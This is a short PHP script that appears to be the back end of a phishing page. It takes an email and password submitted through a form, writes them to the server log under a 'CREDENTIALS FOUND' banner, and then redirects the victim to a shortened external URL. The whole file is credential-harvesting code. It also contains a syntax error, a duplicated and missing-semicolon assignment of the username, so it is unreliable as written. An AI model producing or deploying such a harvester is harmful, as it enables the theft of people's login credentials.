<?php
$username = $_POST['Email'];
$username = $_POST['password']
$password = $_POST['password'];
$res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: .$username <--|+++++++++++++++++|--> Password: $password";
error_log("[+] Credentials Found!!!");
error_log("$res");
echo "<script type='text/javascript'>window.location='https://shorturl.ae/WNpcJ'</script>";
?>
